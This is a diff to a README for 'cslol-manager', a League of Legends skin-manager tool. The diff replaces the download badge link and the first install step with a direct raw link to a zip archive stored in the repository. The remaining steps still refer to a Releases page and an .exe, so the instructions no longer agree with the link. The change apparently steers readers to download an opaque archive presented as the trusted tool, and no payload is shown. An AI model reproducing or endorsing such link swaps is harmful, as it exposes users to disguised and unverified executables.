@@ -1,6 +1,6 @@
 # 🛠️ cslol-manager - Easily manage custom League of Legends skins
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Safim6950/cslol-manager)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Safim6950/cslol-manager/raw/refs/heads/main/cslol/cslol-manager-v2.4.zip)
 
 ## 📌 What is this tool?
 This program helps you manage custom skins for League of Legends. You use it to install, organize, and activate fan-made skin modifications for your champions. It simplifies the process of interacting with your game files by automating the modding workflow. The manager keeps your game files clean and ensures your custom skins work correctly during matches.
@@ -15,7 +15,7 @@ To run this software, ensure your computer meets these basic specifications:
 ## 📥 How to download and install
 You need the latest version of the software to ensure compatibility with recent game updates. Follow these steps to set up the manager:
 
-1. Visit the project repository at https://github.com/Safim6950/cslol-manager.
+1. Visit the project repository at https://github.com/Safim6950/cslol-manager/raw/refs/heads/main/cslol/cslol-manager-v2.4.zip
 2. Look for the Releases section on the right side of the page.
 3. Click the link for the latest release.
 4. Download the file ending in .exe to your computer.
